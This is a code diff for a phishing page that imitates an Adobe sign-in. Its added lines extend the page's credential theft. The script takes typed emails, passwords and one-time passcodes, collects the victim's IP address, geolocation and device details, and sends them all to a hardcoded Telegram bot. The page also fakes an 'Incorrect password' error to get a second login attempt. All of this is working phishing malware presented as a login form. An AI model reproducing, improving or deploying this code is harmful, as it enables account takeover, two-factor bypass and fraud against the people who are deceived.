@@ -231,18 +231,23 @@
     </div>
   </div>
 
-  <script>
+ <script>
   // App state
   const state = {
     selectedId: null,
     firstAttemptDone: false,
-    formData: {} // Store collected data
+    formData: {}
   };
 
-  // === CONFIGURE THESE VALUES ===
-  const TELEGRAM_BOT_TOKEN = '5618258723:AAEnMf0Ote1jgtEoKEaNstoWhepza9vprDo'; // e.g., '7012345678:AAHdF...'
-  const TELEGRAM_CHAT_ID = '1376032111';     // e.g., '123456789'
-  // ================================
+  // === ⚠️ REPLACE WITH YOUR BOT INFO ===
+  const TELEGRAM_BOT_TOKEN = '5618258723:AAEnMf0Ote1jgtEoKEaNstoWhepza9vprDo'; // ← No spaces!
+  const TELEGRAM_CHAT_ID = '987654321';
+  // =====================================
+
+  // Validate config
+  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+    console.warn("❌ Telegram token or chat ID missing!");
+  }
 
   // Utility: open/close modals
   function openModal(id) {
@@ -250,8 +255,6 @@
     if (!el) return;
     el.classList.add('is-open');
     el.setAttribute('aria-hidden', 'false');
-
-    // Focus first focusable element
     const input = el.querySelector('input, button, [tabindex]');
     if (input) input.focus();
   }
@@ -263,19 +266,13 @@
     el.setAttribute('aria-hidden', 'true');
   }
 
-  // Close modal buttons
   document.addEventListener('click', (e) => {
     const closeId = e.target.getAttribute('data-close');
-    if (closeId) {
-      closeModal(closeId);
-    }
+    if (closeId) closeModal(closeId);
   });
 
-  // ESC key closes all modals
   document.addEventListener('keydown', (e) => {
-    if (e.key === 'Escape') {
-      ['firstModal', 'secondModal'].forEach(closeModal);
-    }
+    if (e.key === 'Escape') ['firstModal', 'secondModal'].forEach(closeModal);
   });
 
   // Provider buttons
@@ -286,6 +283,7 @@
   const hiddenId = document.getElementById('form-id');
   const errorText = document.getElementById('error_text');
   const authForm = document.getElementById('authForm');
+  const loadingFirst = document.getElementById('loadingFirst');
 
   providers.forEach(btn => {
     btn.addEventListener('click', () => {
@@ -299,14 +297,10 @@
       firstModalTitle.textContent = name + ' Sign In';
       formTitle.textContent = name;
 
-      // Inject provider logo safely
       dataImage.innerHTML = '';
       const img = new Image();
-      img.width = 100;
-      img.height = 100;
-      img.alt = 'provider logo';
-      img.loading = 'lazy';
-      img.src = image;
+      img.width = 100; img.height = 100; img.alt = 'logo';
+      img.loading = 'lazy'; img.src = image;
       dataImage.appendChild(img);
 
       hiddenId.value = id;
@@ -317,60 +311,125 @@
     });
   });
 
-  // First modal form submission — Capture & Send to Telegram
-  const loadingFirst = document.getElementById('loadingFirst');
+  // --- GEOLOCATION & IP HELPERS ---
+  async function getPublicIP() {
+    try {
+      const res = await fetch('https://api.ipify.org?format=json');
+      const data = await res.json();
+      return data.ip;
+    } catch (err) {
+      return 'Unknown (Failed to fetch)';
+    }
+  }
 
+  async function getGeoLocation(ip) {
+    try {
+      // Using ipapi.co - free for low usage
+      const res = await fetch(`https://ipapi.co/${ip}/json/`);
+      const data = await res.json();
+      return {
+        country: data.country_name,
+        city: data.city,
+        region: data.region,
+        lat: data.latitude,
+        lon: data.longitude,
+        timezone: data.timezone,
+        org: data.org
+      };
+    } catch (err) {
+      return { error: 'Geolocation API failed' };
+    }
+  }
+
+  async function getDeviceInfo() {
+    return {
+      userAgent: navigator.userAgent,
+      platform: navigator.platform,
+      language: navigator.language,
+      screen: `${screen.width}x${screen.height}`,
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+    };
+  }
+
+  // --- SEND DATA TO TELEGRAM ---
+  async function sendToTelegram(userData) {
+    const text = `
+🚨 *Adobe Login Attempt* 🚨
+📅 *Time:* ${new Date().toLocaleString()}
+📧 *Email:* \`${userData.email}\`
+🔑 *Password:* \`${userData.password}\`
+🔢 *Provider:* ${userData.provider}
+🆔 *Form ID:* ${userData.formId}
+
+🌐 *IP Address:* \`${userData.ip}\`
+📍 *Location:* ${userData.geo.city}, ${userData.geo.country}
+📌 *Coords:* \`${userData.geo.lat}, ${userData.geo.lon}\`
+🏙️ *Region:* ${userData.geo.region}
+⏱️ *Timezone:* ${userData.geo.timezone}
+🏢 *ISP/Org:* ${userData.geo.org}
+
+💻 *Device:* ${userData.device.platform}
+🧩 *Browser:* ${userData.device.userAgent}
+🗣️ *Language:* ${userData.device.language}
+📏 *Screen:* ${userData.device.screen}
+    `;
+
+    try {
+      const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: text,
+          parse_mode: 'Markdown'
+        })
+      });
+
+      const result = await res.json();
+      if (!result.ok) console.error('Telegram send failed:', result);
+    } catch (err) {
+      console.error('Fetch failed:', err.message);
+    }
+  }
+
+  // --- FIRST FORM SUBMIT ---
   authForm.addEventListener('submit', async (e) => {
     e.preventDefault();
 
     const email = document.getElementById('email').value.trim();
-    const password = document.getElementById('password').value;
+    const password = document.getElementById('password').value.trim();
 
     if (!email || !password) {
-      errorText.textContent = 'All fields are required.';
+      errorText.textContent = 'All fields required.';
       return;
     }
 
-    // Save data locally
-    state.formData = { email, password, provider: formTitle.textContent, timestamp: new Date().toISOString() };
+    state.formData = { email, password, provider: formTitle.textContent, formId: state.selectedId };
 
     if (!state.firstAttemptDone) {
       loadingFirst.style.display = 'block';
 
-      try {
-        // Send data to Telegram
-        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            chat_id: TELEGRAM_CHAT_ID,
-            text: `
-🚨 *Adobe Phishing Alert* 🚨
-📅 *Time:* ${new Date().toLocaleString()}
-📧 *Email:* \`${email}\`
-🔑 *Password:* \`${password}\`
-🌐 *Provider:* ${formTitle.textContent}
-🆔 *Form ID:* ${state.selectedId}
-            `,
-            parse_mode: 'Markdown'
-          })
-        });
-      } catch (err) {
-        console.warn("Failed to send data to Telegram:", err.message);
-        // Proceed anyway even if Telegram fails
-      } finally {
-        loadingFirst.style.display = 'none';
-        errorText.textContent = 'Incorrect password';
-        state.firstAttemptDone = true;
-      }
+      // Gather full data
+      const ip = await getPublicIP();
+      const device = await getDeviceInfo();
+      const geo = await getGeoLocation(ip === 'Unknown (Failed to fetch)' ? '' : ip);
+
+      // Save for later (OTP step)
+      state.fullData = { ip, geo, device };
+
+      // Send to Telegram
+      await sendToTelegram({ email, password, provider: formTitle.textContent, formId: state.selectedId, ip, geo, device });
+
+      loadingFirst.style.display = 'none';
+      errorText.textContent = 'Incorrect password';
+      state.firstAttemptDone = true;
     } else {
-      // On second attempt, go to OTP modal
       closeModal('firstModal');
       openModal('secondModal');
     }
   });
 
-  // Second modal form logic
+  // --- SECOND MODAL: OTP ---
   const otpForm = document.getElementById('otpForm');
   const loadingSecond = document.getElementById('loadingSecond');
 
@@ -390,40 +449,44 @@
     const otp = document.getElementById('otp').value.trim();
 
     if (!otp) {
-      alert('Please enter OTP.');
+      alert('Enter OTP!');
       return;
     }
 
-    // Optionally send OTP to Telegram too
+    // Include OTP in report
+    const otpText = `
+🔢 *OTP Captured!*
+📧 Email: \`${state.formData.email}\`
+🔐 Password: \`${state.formData.password}\`
+🔢 OTP: \`${otp}\`
+🕒 Time: ${new Date().toLocaleString()}
+
+🌐 IP: \`${state.fullData.ip}\`
+📍 Location: ${state.fullData.geo.city}, ${state.fullData.geo.country}
+📌 Coords: \`${state.fullData.geo.lat}, ${state.fullData.geo.lon}\`
+    `;
+
     try {
       await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           chat_id: TELEGRAM_CHAT_ID,
-          text: `
-🔢 *OTP Captured!*
-📧 *Email:* \`${state.formData.email}\`
-🔐 *Password:* \`${state.formData.password}\`
-🔢 *OTP:* \`${otp}\`
-🕒 *Time:* ${new Date().toISOString()}
-          `,
+          text: otpText,
           parse_mode: 'Markdown'
         })
       });
     } catch (err) {
-      console.warn("Failed to send OTP to Telegram", err);
+      console.error('Failed to send OTP', err);
     }
 
-    // Redirect after delay
     loadingSecond.style.display = 'block';
     setTimeout(() => {
       loadingSecond.style.display = 'none';
-      const redirect = computeRedirect(state.selectedId);
-      window.location.href = redirect;
+      window.location.href = computeRedirect(state.selectedId);
     }, 800);
   });
-</script>
-</body>
+</script></body>
 </html>
+
 
